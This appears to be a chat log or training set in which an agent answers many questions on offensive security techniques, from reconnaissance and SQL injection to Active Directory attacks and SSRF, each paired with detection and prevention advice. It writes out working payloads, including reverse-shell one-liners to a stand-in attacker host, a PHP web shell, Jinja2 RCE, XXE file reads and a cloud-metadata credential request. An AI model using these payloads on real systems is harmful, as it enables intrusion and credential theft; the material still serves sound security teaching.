User: How do I perform reconnaissance on a target network?
Agent: Start with passive information gathering: WHOIS lookup for domain info, DNS enumeration (nslookup, dig), search Google for cached pages, check LinkedIn for employees. Active methods: ping sweep (nmap -sP), port scanning (nmap -sV -sC), banner grabbing, identify services. Use tools like Shodan to find internet-facing devices. Document everything: IP ranges, open ports, services, software versions. Never scan without authorization.

User: What is SQL injection and how does it work?
Agent: SQL injection inserts malicious SQL code into input fields to manipulate database queries. Vulnerable code concatenates user input directly into SQL strings. Example: SELECT * FROM users WHERE username='' + input + '' - if input contains ' OR '1'='1', the query becomes SELECT * FROM users WHERE username='' OR '1'='1'' which returns all users. Types: UNION-based (extract data via UNION SELECT), Boolean-based (true/false queries), Time-based (SLEEP() delays), Error-based (extract via error messages). Prevention: use parameterized queries, input validation, least privilege database users.

User: Explain blind SQL injection exploitation
Agent: Blind SQL injection returns no visible output. Binary search technique: extract one character at a time. Example payload: SELECT SLEEP(5) IF(SUBSTRING(version(),1,1)='5',0,1) - if 5-second delay occurs, first character is '5'. Automation: use sqlmap with --time-sec=5 and --technique=T for time-based. Extraction rate: ~1 character per 5-10 seconds. Optimization: use multiple threads (sqlmap --threads=10). Detection evasion: randomize delays, encode payloads (URL encoding, hex), use comment syntax (/**/). Defense: implement rate limiting, WAF signatures for SLEEP/BENCHMARK, query logging with alerts.

User: How would you exploit a cross-site scripting (XSS) vulnerability?
Agent: XSS injects JavaScript that executes in victims' browsers. Stored XSS: malicious script permanently stored in database, affects all users viewing page. Reflected XSS: script in URL parameters, affects only users clicking link. DOM-based: JavaScript manipulates page structure unsafely. Payload examples: <script>alert('XSS')</script>, <img src=x onerror=alert('XSS')>, <svg onload=alert('XSS')>. Exploitation: steal cookies/session tokens, redirect to phishing, perform actions as user. Detection: WAF filters HTML tags, browser CSP headers block inline scripts. Prevention: sanitize all user input, encode output, implement Content-Security-Policy, use HTTPOnly cookies, validate input server-side.

User: What is cross-site request forgery (CSRF)?
Agent: CSRF tricks authenticated users into performing unwanted actions. Attack: attacker creates malicious page with hidden form submitting to target bank.com, user visits page while logged in, browser sends credentials automatically, transfer executed without user knowledge. Exploitation: state-changing operations (fund transfer, password change, email update). Prevention: CSRF tokens (unpredictable, per-session), verify Origin header, SameSite cookie attribute, require POST instead of GET, ask for password confirmation on sensitive operations. Detection: monitor unusual request patterns from legitimate users, implement behavioral analysis, check referrer headers.

User: Explain privilege escalation techniques
Agent: Privilege escalation moves from low-privilege user to administrator/root. Windows methods: exploit unquoted service paths (add space triggers code execution), DLL hijacking (replace DLL in search path), token impersonation (SeImpersonatePrivilege), kernel exploits (CVE vulnerabilities). Linux methods: SUID binaries (execute with owner privileges, often root), sudo misconfigurations (user can run specific command as sudo without password), cron jobs running as root, weak file permissions. Tools: Windows Privilege Escalation by fuzzysecurity (GitHub), Linux Privilege Escalation by swisskyrepo. Detection: monitor privilege grant attempts, audit command execution, watch SUID changes. Prevention: patch kernel vulnerabilities, remove unnecessary SUID binaries, audit sudo permissions, enable Security Enhanced Linux (SELinux).

User: What is a man-in-the-middle (MITM) attack?
Agent: MITM intercepts communication between two parties without their knowledge. ARP spoofing: attacker sends gratuitous ARP packets, associates their MAC with victim IP, traffic routes through attacker. SSL stripping: downgrade HTTPS to HTTP, intercept unencrypted data. DNS spoofing: hijack DNS responses, redirect to malicious site. Tools: Bettercap (ARP spoofing), mitmproxy (SSL interception), Wireshark (traffic analysis). Exploitation: credential theft, data modification, malware injection. Detection: certificate validation errors, HTTPS enforcement via HSTS, certificate pinning. Prevention: use VPNs, verify SSL certificates, implement DNSSEC, network segmentation, monitor for unusual ARP activity.

User: How do you exploit a remote code execution vulnerability?
Agent: RCE allows arbitrary command execution on target system. Common vectors: unsafe deserialization (Java ObjectInputStream), command injection (concatenating user input into shell commands), template injection (Jinja2 ${__import__}), file inclusion (PHP include($_GET['file'])). Exploitation: execute reverse shell to attacker's machine, install backdoors, exfiltrate data. Reverse shell example: bash -i >& /dev/tcp/attacker-ip/4444 0>&1 connects to attacker listening on port 4444. Detection: monitor unusual process creation, network connections, file system changes. Prevention: disable dangerous functions (eval, exec, serialize), input validation, parameterized execution, sandboxing, principle of least privilege.

User: What is Active Directory exploitation?
Agent: Active Directory manages Windows domain authentication and authorization. Kerberoasting: request service tickets for SPNs, crack offline with GPU (service accounts often weak passwords). Golden Ticket: forge TGT with krbtgt hash, impersonate any user. Pass-the-Hash: use NTLM hash instead of password (Windows authentication accepts hashes). Lateral movement: compromise initial machine, extract credentials from LSASS (Mimikatz), use credentials on other machines. Tools: Mimikatz (credential dumping), BloodHound (AD mapping), Impacket (exploitation). Detection: monitor unusual Kerberos requests, SPNs discovery, NTLM usage patterns, admin logons from non-admin workstations. Prevention: enforce strong passwords on service accounts (20+ chars), implement MFA, use credential guard, monitor AD changes, disable NTLM if possible.

User: How do you perform a Man-in-the-Middle attack with ARP spoofing?
Agent: ARP (Address Resolution Protocol) maps IP addresses to MAC addresses. ARP spoofing floods network with fake ARP replies associating attacker's MAC with victim's IP. Tools: arpspoof (dsniff suite), ettercap, bettercap. Steps: 1) Identify target IP and gateway IP, 2) Send ARP replies claiming to be gateway (to target) and claiming to be target (to gateway), 3) Traffic flows through attacker's machine. Exploitation: passive (sniff unencrypted traffic), active (modify packets). Detection: ARP table inconsistencies, static ARP entries, DAI (Dynamic ARP Inspection) on switches. Prevention: use VPN, HTTPS encryption, static ARP entries, VLAN segmentation, network monitoring for ARP anomalies.

User: Explain SQL injection UNION-based attacks
Agent: UNION-based SQL injection combines results from multiple queries. Vulnerable query: SELECT username, password FROM users WHERE id=X UNION SELECT @@version, NULL. Steps: 1) Identify number of columns (ORDER BY 1, 2, 3...), 2) Determine data types (SELECT 1, '2', 3...), 3) Execute UNION with selected columns. Example: 1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database(). Advantages: fast data extraction, database enumeration. Detection: monitor unusual UNION keywords, column enumeration attempts. Prevention: parameterized queries, input validation, error suppression, WAF rules blocking UNION patterns.

User: What is a zero-day vulnerability?
Agent: Zero-day is a security flaw unknown to vendor with no patch available. Highly valuable to attackers and security researchers. Examples: CVE-2021-44228 (Log4Shell), CVE-2021-34527 (PrintNightmare). In the wild exploitation: attackers use before patches released, mass compromise possible. Responsible disclosure: security researcher reports to vendor, 90-day deadline for patch, then public disclosure. Bug bounty programs reward finding zero-days ($10K-$100K+). Detection: behavior-based detection (unusual activity even without signature), network anomalies, process execution patterns. Response: air-gap critical systems, apply patches immediately upon release, implement compensating controls (WAF rules, network segmentation).

User: How would you exploit insecure deserialization?
Agent: Deserialization reconstructs objects from serialized data without validation. Dangerous: untrusted input could instantiate malicious objects with arbitrary code execution. Java: use ysoserial to generate gadget chains (CommonCollections, Spring Framework, JNDI), Java -jar ysoserial.jar CommonsCollections5 'id' | nc target 1234. .NET: ObjectDataProvider enables method invocation. Python: pickle module reconstructs objects via __reduce__ methods. Tools: marshalsec for Java exploitation. Detection: monitor ObjectInputStream usage, unusual class instantiation, process creation post-deserialization. Prevention: disable deserialization, implement whitelist of allowed classes (JEP 290), use safe parsers (JSON), update libraries, code review for serialization.

User: Explain DNS enumeration techniques
Agent: DNS enumeration reveals domain structure and IP ranges. Zone transfer: request all DNS records from server (nslookup -type=AXFR domain.com @ns-server). Reverse DNS lookup: find hostnames from IP addresses. Subdomain brute force: test common subdomains (www, mail, ftp, admin, test). Tools: nslookup, dig, fierce, sublist3r. Information gathered: mail servers, name servers, web servers, potential targets. Detection: monitor DNS query patterns, zone transfer requests, brute force attempts. Prevention: disable zone transfers to unauthorized clients, rate limit DNS queries, implement DNS security (DNSSEC), monitor DNS logs.

User: What is a denial of service (DoS) attack?
Agent: DoS overwhelms system with requests/traffic, making service unavailable. Types: volumetric (consume bandwidth: UDP flood, DNS amplification), protocol (exploit implementation flaws: SYN flood, Ping of Death), application (exhaust resources: HTTP flood, Slowloris). DDoS (Distributed DoS) uses multiple compromised systems (botnets) for amplification. Tools: hping3, slowhttptest, Apache Bench for testing. Mitigation: rate limiting, geographic blocking, anycast routing, CDN protection, DDoS mitigation services (Cloudflare, Akamai), router configuration (SYN cookies, ingress filtering). Detection: unusual traffic patterns, bandwidth spikes, connection table exhaustion.

User: How do you exploit a file inclusion vulnerability?
Agent: File inclusion allows loading arbitrary files into application. Local File Inclusion (LFI): include local files (../../etc/passwd). Remote File Inclusion (RFI): include remote files (http://attacker.com/shell.php). Exploitation: read configuration files (database credentials), include webshells for RCE, access system files (Apache logs). Prevention: disable file inclusion functions (disable_functions in php.ini), input validation/whitelist, avoid user-controlled file paths, use file function instead of include, remove unnecessary include functions. Detection: monitor file inclusion patterns, unusual file access, log analysis for traversal attempts.

User: Explain brute force attacks
Agent: Brute force tests all possible password combinations until correct one found. Offline attacks: target hash file (leaked database), try combinations against hash (GPU acceleration with Hashcat or John). Online attacks: test credentials against live service (slower due to rate limiting). Dictionary attacks: use common password lists (faster than pure brute force). Tools: Hashcat (GPU-accelerated hashing), John the Ripper (password cracking), Hydra (online brute force). Mitigation: rate limiting, account lockout policies, captcha, strong password requirements, 2FA, monitoring for brute force patterns. Detection: failed login attempts, lockout events, unusual authentication patterns.

User: What is a reverse shell and how do you establish one?
Agent: Reverse shell creates remote command access from target back to attacker. Traditional shell listens on target (bind shell), reverse shell connects from target to attacker (bypasses firewalls blocking incoming connections). Examples: bash -i >& /dev/tcp/attacker-ip/4444 0>&1, python -c "import socket,subprocess,os;s=socket.socket();s.connect(('attacker-ip',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])", nc attacker-ip 4444 -e /bin/bash. Setup: attacker runs nc -lvnp 4444 to listen. Detection: monitor outbound connections from servers, unusual process parent-child relationships, netstat anomalies. Prevention: egress filtering (block outbound connections), application whitelisting, monitor process execution.

User: How do you perform a password spraying attack?
Agent: Password spraying tests common passwords against many accounts, avoiding lockouts. Strategy: try 1-3 common passwords (password123, Welcome2024) against 1000+ users instead of 10 attempts per user. Advantages: slower than brute force but evades account lockout, higher success rate than random attempts. Tools: Hydra, Spray (Microsoft 365 targeting). Detection: monitor multiple failed logins from different accounts, same source IP. Prevention: account lockout policies with delays, rate limiting per IP/username, MFA, strong password requirements, anomaly detection, behavioral analysis.

User: What is a phishing attack?
Agent: Phishing tricks users into divulging sensitive information via deceptive emails/websites. Email phishing: fake emails appearing from trusted companies (banks, PayPal, Amazon) with links to fake login pages. Spear phishing: targeted attacks on specific individuals with personalized information (name, company). Whaling: targets executives/CEOs. Vishing: voice phishing (phone calls pretending to be support). Exploitation: credential theft, malware distribution. Prevention: email filtering, user training, email authentication (SPF, DKIM, DMARC), multi-factor authentication, suspicious link warnings. Detection: domain name variations (amaz0n.com), suspicious sender addresses, urgent language, unusual requests.

User: Explain command injection attacks
Agent: Command injection executes arbitrary system commands through vulnerable applications. Vulnerable: runtime.exec("ping " + userInput) allows command chaining. Payloads: ; command (execute after), | command (pipe output), && command (conditional), || command (alternative), ` command ` (command substitution), $(command) (substitution). Example: ping 127.0.0.1; cat /etc/passwd executes cat after ping. Prevention: avoid shell execution (use ProcessBuilder in Java with array), parameterized execution, input whitelist validation, disable dangerous functions (exec, shell_exec, system), principle of least privilege. Detection: monitor process creation from applications, unusual command execution, parent-child process relationships.

User: What is privilege escalation via sudo?
Agent: Sudo misconfigurations allow unauthorized privilege escalation. Vulnerability: sudo -l shows commands user can run without password. Exploit: NOPASSWD entry (sudo /bin/bash without password), wildcard commands (sudo /usr/bin/* allows any command in that directory), relative path usage (exploit PATH variable). Example: user can run /usr/bin/python without password, execute sudo python -c "import os;os.system('/bin/bash')" for root shell. Prevention: audit sudoers file (visudo), remove NOPASSWD entries for dangerous commands, use absolute paths, restrict to specific commands with arguments. Detection: monitor sudo usage, audit sudoers changes, alert on privilege escalation attempts.

User: How do you exploit a buffer overflow?
Agent: Buffer overflow writes data beyond allocated buffer, overwriting adjacent memory. Stack overflow: overwrite return address with shellcode address, execute arbitrary code. Heap overflow: corrupt heap metadata for arbitrary write. Requires: vulnerable code (strcpy without bounds check), ASLR disabled or bypassed, DEP/NX bypassed (ROP gadgets). Tools: IDA Pro (disassembly), GDB (debugging), pwntools (exploit development). Modern mitigations: ASLR (randomize memory layout), DEP/NX (prevent execution from data), stack canaries (detect overwrites). Prevention: use safe functions (strncpy instead of strcpy), bounds checking, compiler protections (-fstack-protector), memory safety languages (Rust).

User: What is a kernel exploit?
Agent: Kernel exploits compromise the operating system kernel for complete system control. Types: buffer overflow (kernel memory corruption), use-after-free (exploit freed memory reuse), race conditions (timing window vulnerability), privilege escalation (normal user to root). Examples: CVE-2021-22555 (Netfilter vulnerability in Linux), CVE-2017-1000112 (UFO packet kernel bug). Tools: searchsploit finds public exploits, kernel exploit databases, custom development. Impact: kernel compromise, all security bypassed, persistent backdoor installation. Detection: kernel integrity checking, rootkit detection tools, process monitoring. Prevention: keep kernel updated, disable unnecessary kernel modules, implement SELinux/AppArmor, kernel hardening (SMEP, SMAP), runtime security monitoring.

User: Explain LDAP injection attacks
Agent: LDAP injection manipulates LDAP queries through user input. Vulnerable: uid={USER}&password={PASS} with asterisks. Attack: uid=*))(&(uid=* or uid=admin*))(&(password=* bypasses authentication. Extraction: extract directory via filter manipulation (enumerate users, groups, attributes). Tools: ldapsearch, custom LDAP queries. Detection: monitor LDAP query patterns, unusual filter syntax. Prevention: parameterized LDAP queries, input validation/escaping, rate limiting, least privilege LDAP binds, audit LDAP access.

User: What is XXE (XML External Entity) injection?
Agent: XXE exploits XML parser processing external entities. Vulnerable: XML parser loads external DTD/entity definitions. Attacks: read local files (DOCTYPE with ENTITY pointing to file:///etc/passwd), SSRF (internal service access), billion laughs DoS (entity expansion). Payloads: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>. Detection: XXE detection tools, WAF patterns. Prevention: disable external entity processing, disable DTD processing, use modern XML parsers with XXE protection, input validation, implement resource limits.

User: How do you exploit a server-side template injection?
Agent: SSTI injects template code into templating engines. Identify: test {{7*7}}, {{7*'7'}}, ${7*7}, <% 7*7 %>. Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}} for RCE. ERB: <%=`id`%> for command execution. Tools: Burp Intruder, manual testing. Prevention: isolate user input, use safe templating libraries, sandbox rendering, disable dangerous functions, input validation. Detection: template syntax patterns, unusual variable access, process execution from templates.

User: What is a CSRF token bypass?
Agent: CSRF tokens prevent unauthorized state-changing requests. Bypass techniques: token not checked for GET requests (exploit with img src=), token not regenerated on login (reuse from first page load), predictable token (weak randomness), token in referer header (leaked via referrer), token stored in cookie (read via XSS). Prevention: token per request, secure random generation, validate on all state-changing operations, SameSite cookies, verify origin header. Detection: monitor CSRF attempts, unusual request patterns without valid tokens.

User: Explain insecure direct object reference (IDOR) vulnerabilities
Agent: IDOR occurs when application doesn't verify user has permission to access object. Example: /users/profile?id=123, attacker changes to id=124 accessing another user. Exploitation: enumerate IDs (123, 124, 125), access resources of other users, privilege escalation. Testing: modify IDs in requests, observe differences. Prevention: implement authorization checks (verify ownership), use indirect references (user1_profile instead of 123), validate all object access. Detection: audit authorization checks, test all parameters for IDOR.

User: What is a man-in-the-middle attack via DNS?
Agent: DNS MITM redirects traffic to attacker-controlled IP. DNS poisoning: attacker sends spoofed DNS response before legitimate one, cache stores false mapping. Tools: Bettercap, dnsmasq. Exploitation: phishing (redirect to fake bank.com), credential harvesting. Detection: DNSSEC validation, verify DNS responses, monitor DNS logs. Prevention: DNSSEC implementation, query authentication, DNS-over-HTTPS, use trusted resolvers.

User: How do you exploit a race condition?
Agent: Race conditions occur when outcome depends on timing of events. TOCTOU (Time-of-check-time-of-use): check file permissions, attacker deletes file, overwrite unexpected file. Exploitation: create high-concurrency scenarios with multiple threads. Example: check balance=1000, deduct 500 twice simultaneously, both succeed leaving balance=500 instead of negative. Testing: stress test with wrk, concurrent requests. Prevention: atomic operations, proper locking, transactional semantics, validate repeatedly, use mutexes/semaphores.

User: Explain Kerberoasting attacks
Agent: Kerberoasting extracts service account passwords from Kerberos tickets. Service account tickets encrypted with NTLM hash (often weak). Steps: request service ticket for any SPN, receive TGS ticket, crack offline (Hashcat). Enumeration: GetUserSPNs.ps1 finds SPNs. Tools: Impacket, Rubeus. Mitigation: enforce strong passwords on service accounts (20+ chars), use managed service accounts, implement credential guard, monitor TGS-REQ. Detection: unusual service ticket requests, TGS enumeration.

User: What is a golden ticket attack in Kerberos?
Agent: Golden ticket forges Kerberos TGT (Ticket Granting Ticket) using krbtgt hash. Steps: extract krbtgt hash from domain controller (Mimikatz), create arbitrary TGT with any user/group membership, use to access any resource. Extremely stealthy (bypasses normal authentication). Mitigation: reset krbtgt hash twice (invalidates forged tickets), enable audit logging, monitor unusual TGT requests. Detection: impossible to detect properly (tickets look valid), behavioral analysis of user activity.

User: How do you exploit a weak encryption implementation?
Agent: Weak encryption breaks confidentiality. Vulnerabilities: DES (56-bit, breakable), MD5 hashing (collision attacks), hardcoded encryption keys, reused IVs/nonces, ECB mode (patterns visible), predictable randomness. Exploitation: brute force weak keys, derive nonces from timestamps, rainbow tables for MD5. Prevention: use AES-256-GCM, generate random IVs, use cryptography library (not custom), constant-time comparisons, key rotation.

User: What is a path traversal attack?
Agent: Path traversal manipulates file paths to access unintended files. Payloads: ../../etc/passwd, ..\\..\\windows\\system32\\drivers\\etc\\hosts (Windows). Encoding bypass: %2e%2e%2f (URL encoding), %252e%252e%252f (double encoding), ..%5c (Unicode). Testing: modify file path parameters with traversal sequences. Prevention: validate against whitelist, canonicalize paths, use chroot jails, avoid user input in file paths, implement path validation.

User: How do you exploit insecure randomness?
Agent: Weak random number generation breaks security. Vulnerable: Math.random() for cryptography, seeding from time/PID (predictable). Exploitation: predict next value, brute force seed, statistical analysis. Prevention: use cryptographically secure RNG (os.urandom(), secrets module, /dev/urandom), proper seeding, entropy validation.

User: Explain man-in-the-middle via ARP spoofing step-by-step
Agent: 1) Identify target IP (victim), gateway IP (router), 2) Flood network with ARP packets: "I am gateway" (to victim), "I am victim" (to gateway), 3) Victim sends traffic to attacker thinking it's gateway, gateway sends traffic to attacker thinking it's victim, 4) Attacker forwards traffic between both (or intercepts). Tools: arpspoof -i eth0 -t victim-ip gateway-ip. Sniffing: use Wireshark to capture unencrypted traffic. Prevention: static ARP entries, DAI (Dynamic ARP Inspection), encrypted traffic (HTTPS/VPN).

User: What is a stored XSS attack?
Agent: Stored XSS permanently saves malicious script in database. User submits <script>alert('XSS')</script> in comment, script stored in database, executed for every user viewing page. Exploitation: steal cookies, capture credentials, deface site, malware distribution. Prevention: sanitize all input (remove script tags), encode output, implement CSP headers, validate input server-side, use template escaping.

User: How do you exploit a reflected XSS vulnerability?
Agent: Reflected XSS passes malicious script in URL parameters. Attacker sends link: site.com/?search=<script>alert('XSS')</script>, victim clicks, script executes. Exploitation: redirect to phishing, steal credentials from URL parameters. Prevention: encode output based on context, implement CSP, validate input, URL encode parameters.

User: What is DOM-based XSS?
Agent: DOM-based XSS manipulates page structure via JavaScript unsafely. Vulnerable: document.getElementById('output').innerHTML = location.hash (uses user-controlled hash). Attack: site.com#<img src=x onerror=alert('XSS')>, JavaScript inserts into DOM. Prevention: use textContent instead of innerHTML, sanitize DOM manipulation, validate input, CSP enforcement.

User: Explain password cracking techniques
Agent: Brute force: try all combinations (slow). Dictionary attacks: test common passwords (faster). Rainbow tables: pre-computed hash-password pairs (very fast if undefended). GPU acceleration: Hashcat on NVIDIA GPU (1000x speedup). Salting: add random value before hashing (defeats rainbow tables). Prevention: use strong hashing (bcrypt, argon2, scrypt), implement salt per password, add pepper (secret server value), rate limit login attempts, implement 2FA.

User: What is a replay attack?
Agent: Replay attack captures and retransmits authentication/transaction to impersonate user. Vulnerable: no timestamp/nonce validation. Example: capture encrypted login session, replay to gain access. Prevention: use timestamps (reject old messages), nonces (one-time values), session IDs (invalidate after use), encryption with authentication (HMAC). Detection: monitor for duplicate requests, anomalous behavior patterns.

User: How do you exploit a session hijacking vulnerability?
Agent: Session hijacking steals or predicts session tokens to impersonate users. Methods: sniff unencrypted traffic (HTTP), XSS cookie theft, session fixation (force user specific session ID). Prevention: HTTPOnly cookies (prevent JavaScript access), Secure flag (HTTPS only), SameSite attribute (prevent CSRF-based hijacking), short session duration, regenerate session after login. Detection: monitor session creation/usage patterns, detect simultaneous sessions for same user.

User: What is a Slowloris attack?
Agent: Slowloris DoS attack sends slow HTTP requests keeping connections open, exhausting server resources. Sends headers one at a time with long delays, server keeps connection open waiting for complete request. Tools: slowhttptest. Prevention: set timeouts on incomplete requests, rate limiting, deploy WAF, use proxy/reverse proxy with connection limits. Detection: monitor for connections with incomplete requests, unusual hold times.

User: How do you exploit business logic flaws?
Agent: Business logic flaws violate intended workflow. Examples: discount codes stacking infinitely, bypass payment by modifying order status, withdraw before deposit completes (race condition). Exploitation: understand workflow, find loopholes, automate exploitation. Prevention: validate state transitions, implement idempotency, enforce workflow sequencing, implement authorization checks, audit business logic thoroughly. Detection: monitor for unusual activity patterns, workflow violations.

User: What is a timing attack?
Agent: Timing attack exploits execution time differences to extract secrets. Example: password comparison function compares character-by-character, returns early on mismatch, attacker measures response time to determine correct character. Prevention: constant-time comparisons (always check all characters), avoid early returns on mismatches, add random delays. Detection: analyze response times for patterns, implement intrusion detection for timing patterns.

User: Explain API exploitation techniques
Agent: APIs vulnerable to injection, broken auth, insecure data transmission. OWASP API Top 10: broken object level authorization (IDOR), user authentication, excessive data exposure, lack of resource throttling, broken function level authorization, mass assignment, improper assets management, injection attacks. Testing: enumerate endpoints, test authorization, fuzz parameters, check data exposure. Prevention: implement API authentication (OAuth 2.0, API keys), authorization checks, rate limiting, input validation, encrypt sensitive data, comprehensive logging.

User: What is insecure direct object reference in APIs?
Agent: API exposes internal IDs without authorization. /api/users/123/profile, attacker modifies to 124. Prevention: implement authorization check on every endpoint, use opaque identifiers (random tokens instead of sequential IDs), verify user owns requested object. Testing: modify IDs, attempt cross-user access.

User: How do you exploit a GraphQL API?
Agent: GraphQL allows querying complex nested data. Exploitation: deeply nested queries cause resource exhaustion, query for sensitive data exposure, mutation bypasses (incorrect authorization), introspection queries reveal entire schema. Prevention: implement query depth limiting, query complexity analysis, rate limiting, proper authorization checks, disable introspection in production, monitor and alert on suspicious queries. Detection: monitor for complex queries, unusual field access patterns.

User: What is a NoSQL injection attack?
Agent: NoSQL injection manipulates queries in MongoDB/NoSQL databases. Example: db.collection.find({username: req.body.username}) with input {$ne: null} becomes find({username: {$ne: null}}) returning all documents. Advanced: {$regex: ".*"}, {$exists: true}, {$where: "function"}. Prevention: input validation/sanitization, parameterized queries, schema validation, principle of least privilege on DB, avoid JavaScript evaluation.

User: How do you exploit a Server-Side Template Injection (SSTI)?
Agent: SSTI injects template directives into user input. Identify: test {{7*7}}, observe if calculation appears in output. Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}} for RCE. Tools: Burp Intruder, tplmap. Prevention: sandbox templating engine, disable dangerous functions, input validation, use safe template libraries. Detection: test for template syntax in inputs, monitor template processing.

User: What is a Server-Side Request Forgery (SSRF) attack?
Agent: SSRF tricks server into making requests to unintended destinations. Example: make server request localhost:6379 (Redis), access internal services. Cloud exploitation: request 169.254.169.254/latest/meta-data/iam/security-credentials/ (AWS metadata). Prevention: whitelist allowed hosts, validate URLs strictly, disable unnecessary protocols (file://, gopher://), network segmentation. Detection: monitor server outbound connections, unusual internal requests, cloud metadata access attempts.

User: How do you perform credential stuffing attacks?
Agent: Credential stuffing tests leaked passwords against many websites (people reuse passwords). Tooling: Hydra with password lists from previous breaches. Exploitation: automate login attempts across multiple sites. Prevention: implement rate limiting on login, CAPTCHA after failures, 2FA, monitor for credential stuffing patterns, enable alerts for multiple failures. Detection: multiple login failures from same IP/username, unusual geographic access patterns.

User: What is information disclosure vulnerability?
Agent: Application exposes sensitive information unintentionally. Examples: detailed error messages revealing database structure, stack traces showing file paths and versions, source code in comments, API responses with unnecessary data. Prevention: generic error messages (log details server-side), disable stack trace display, remove comments before production, minimize API response data, implement least privilege on information exposure. Detection: review error messages, API response analysis, source code review.

User: How do you exploit a web shell?
Agent: Web shell uploaded to server provides remote access. Upload methods: file upload vulnerabilities, path traversal during upload, archive extraction (upload ZIP with shell). Access: visit uploaded shell URL, execute commands via web interface. Example PHP shell: <?php system($_GET['cmd']); ?>. Prevention: disable script execution in upload directories, validate file types (magic bytes), store uploads outside webroot, randomize filenames. Detection: monitor file uploads, unusual files in web directories, unexpected script execution.

User: What is an Oracle padding attack?
Agent: Padding oracle exploits encryption validation side channel. Attacker observes whether padding is valid/invalid for ciphertexts, extracts plaintext through binary search. Tool: PadBuster. Prevention: use authenticated encryption (AES-GCM), constant-time padding validation, don't reveal padding errors. Detection: monitor decryption error patterns.

User: How do you exploit an insecure authentication mechanism?
Agent: Weak auth allows unauthorized access. Vulnerabilities: no account lockout (brute force), predictable tokens, forgotten password reset (guessable questions), cookie-based sessions (fixation). Prevention: rate limiting, strong random token generation, MFA, secure password reset process, HttpOnly/Secure/SameSite cookies. Detection: failed login patterns, unusual authentication flows.

User: What is account enumeration?
Agent: Attacker determines valid usernames/emails without access. Techniques: different error messages ("user not found" vs "wrong password"), timing differences (valid accounts slower due to password hashing), password reset endpoints reveal valid emails. Prevention: identical error messages, constant-time password comparison, rate limiting. Detection: monitor enumeration patterns.

User: How do you exploit a race condition in authentication?
Agent: Race condition in auth check-execute window. Example: check if account is locked, increment login counter simultaneously, both checks pass, no lockout. Prevention: atomic operations, proper locking mechanisms, atomic increment operations. Detection: monitor for authentication bypasses, unusual patterns.

User: What is a certificate pinning bypass?
Agent: Certificate pinning prevents MITM by verifying specific certificate. Bypass: modify application to accept invalid certificates, proxy interception (if pinning not strict), certificate extraction from compromise. Prevention: strict pinning implementation, certificate transparency logs, backup certificates. Detection: monitor for certificate changes, unusual TLS connections.

User: How do you exploit insecure data storage?
Agent: Sensitive data stored unencrypted or weakly encrypted. Examples: passwords in plaintext, API keys in config files, secrets in version control history. Exploitation: compromise system → read sensitive data. Prevention: encrypt sensitive data at rest (AES-256), use secure storage APIs, never commit secrets to git, implement access controls, secret scanning tools. Detection: audit data storage practices, secret scanning.

User: What is a Unicode normalization vulnerability?
Agent: Unicode normalization creates equivalent representations. Exploitation: bypass filters using alternate Unicode representations. Example: xss vs х\u0073\u0073 (lookalike characters). Prevention: normalize input before validation, use strict character whitelisting. Detection: test with Unicode variations.

User: How do you exploit an XML bomb?
Agent: XML bomb (billion laughs) causes DoS via entity expansion. <!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">...]> expands exponentially consuming memory. Prevention: disable external entities, limit entity expansion depth, use modern parsers with XXE protection. Detection: monitor entity expansion patterns.

User: What is a MIME type sniffing attack?
Agent: Browser sniffs file type ignoring Content-Type header. Upload HTML as image, browser executes as HTML. Prevention: set X-Content-Type-Options: nosniff, validate MIME types (magic bytes), store uploads outside webroot. Detection: monitor file types and headers.

User: How do you exploit weak SSL/TLS implementation?
Agent: SSL/TLS vulnerabilities: downgrade attacks (force older versions), weak ciphers, certificate validation bypasses, heartbleed (memory leak). Prevention: disable older TLS versions (<1.2), use strong ciphers (AES-256), enforce certificate validation, regular patching. Detection: SSL/TLS scanning tools, certificate monitoring.

User: What is a polyglot file attack?
Agent: Polyglot files valid in multiple formats simultaneously. Valid image + PHP code: upload as image, access as PHP for execution. Prevention: validate magic bytes (file signatures), disable execution in upload directories, use file type detection beyond extension. Detection: audit file uploads, analyze suspicious files.

User: How do you exploit a symlink race condition?
Agent: Symlink race after file creation. Create temp file → attacker creates symlink → application writes to symlink → overwrites unintended file. Prevention: use secure APIs (mkstemp with O_EXCL), check for symlinks, atomic operations. Detection: monitor symlink creation, audit file operations.

User: What is a resource exhaustion attack?
Agent: Exhaust system resources causing DoS. Types: CPU (regex DoS), memory (large allocations), disk (huge uploads), network (bandwidth). Prevention: rate limiting, request size limits, timeout enforcement, resource quotas. Detection: monitor resource usage, unusual patterns.

User: How do you perform a DNS amplification attack?
Agent: Use open DNS resolvers for DDoS. Send DNS query with spoofed source (victim IP), resolver sends large response to victim, amplified traffic. Prevention: configure DNS resolver to not respond to external queries, rate limiting, ACLs. Detection: monitor DNS traffic, unusual amplification patterns.

User: What is a cache poisoning attack?
Agent: Store malicious content in cache affecting all users. Example: craft request with Host: attacker.com, cache stores response, other users see attacker's content. Prevention: normalize Host header, validate Host strictly, implement cache key normalization. Detection: test with unusual Host headers.

User: How do you exploit a clickjacking vulnerability?
Agent: Trick user into clicking hidden element. Overlay transparent iframe over real page, user clicks invisible sensitive button. Prevention: X-Frame-Options: DENY, CSP frame-ancestors, frame-busting JavaScript. Detection: check frame-related headers.

User: What is a cross-origin resource sharing (CORS) misconfiguration?
Agent: Allow-Origin: * allows any origin to access resource. Attacker domain makes CORS request, reads response if credentials exposed. Prevention: whitelist specific origins, never use * with credentials. Detection: test CORS headers with different origins.

User: How do you exploit a parameter pollution attack?
Agent: Send same parameter multiple times, application/WAF parse differently. Exploitation: bypass security controls, inject malicious values. Prevention: reject duplicate parameters, consistent parsing. Detection: test with duplicate parameters.

User: What is a security misconfiguration vulnerability?
Agent: Vulnerabilities from default settings, unnecessary services, verbose errors. Examples: default credentials, debug mode enabled, directory listing. Prevention: disable unnecessary services, change defaults, suppress detailed errors, regular security audits. Detection: configuration review, vulnerability scanning.